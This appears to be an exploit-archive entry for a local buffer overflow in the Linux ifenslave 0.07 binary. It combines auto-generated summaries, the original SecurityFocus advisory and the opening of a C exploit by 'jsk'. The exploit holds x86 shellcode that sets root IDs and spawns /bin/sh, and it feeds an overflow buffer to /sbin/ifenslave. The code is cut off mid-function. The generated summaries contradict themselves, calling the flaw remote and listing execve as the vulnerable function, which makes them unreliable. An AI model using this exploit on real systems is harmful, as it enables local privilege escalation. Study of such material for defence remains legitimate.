// #<-- Publish Date --># // 2003-05-26 // #<-- Technical Document Summary (TDS) --># // The vulnerability stems from insufficient bounds checking on user-supplied data before copying it into internal memory. This allows a local attacker to execute arbitrary code within the context of ifenslave. The affected component is the ifenslave binary for Linux, specifically version 0.07 and possibly earlier releases. The exploit enables remote code execution by manipulating input buffers. Not specified in source. // #<-- Layman's Document Summary (LDS) --># // The weakness allows an attacker to run malicious code on a system where ifenslave is installed and not set to require setUID or setGID permissions. It does not claim successful exploitation, only the potential for arbitrary code execution. The issue resides in how input data is handled before being processed by the program's internal memory functions. Not specified in source. // #<-- Key Words (KW) --># // ifenslave buffer overflow, local buffer overflow, setUID, setGID, Linux, shellcode injection, arbitrary code execution, argument parsing vulnerability, UNIX exploit, binary exploitation, memory corruption, local privilege escalation // #<-- Related Terms --># // buffer overflow, local privilege escalation, UNIX exploit, memory corruption, arbitrary code execution, ifenslave, shellcode, setUID, setGID, Linux kernel, argument handling, local attack vector // #<-- Entities/Attributes --># // Product: ifenslave version 0.07 (and possibly earlier) Author: jsk Platform: Linux Vulnerable function: execve, BUFSIZE constant, shellcode array, HOME environment variable // #<-- Vulnerability Type --># // Not specified in source // #<-- Original Content --># // source: https://www.securityfocus.com/bid/7682/info ifenslave for Linux has been reported prone to a buffer overflow vulnerability. The issue is reportedly due to a lack of sufficient bounds checking performed on user-supplied data before it is copied into an internal memory space. It is possible for a local attacker to seize control of the vulnerable application and have malicious arbitrary code executed in the context of ifenslave. ifenslave is not installed setUID or setGID by default. It should be noted that although this vulnerability has been reported to affect ifenslave version 0.07 previous versions might also be affected. #include <stdio.h> #include <stdlib.h> #include <unistd.h> #define BUFSIZE 40 char shellcode[] = "\x31\xdb" "\x89\xd8" "\xb0\x17" "\xcd\x80" "\x31\xdb" "\x89\xd8" "\xb0\x17" "\xcd\x80" "\x31\xdb" "\x89\xd8" "\xb0\x2e" "\xcd\x80" "\x31\xc0" "\x50" "\x68\x2f\x2f\x73\x68" "\x68\x2f\x62\x69\x6e" "\x89\xe3" "\x50" "\x53" "\x89\xe1" "\x31\xd2" "\xb0\x0b" "\xcd\x80" "\x31\xdb" "\x89\xd8" "\xb0\x01" "\xcd\x80"; int main(void) { char buf[BUFSIZE+10]; char *prog[] = {"/sbin/ifenslave", buf, NULL}; char *env[] = {"HOME=BLA", shellcode, NULL}; printf("****************************************

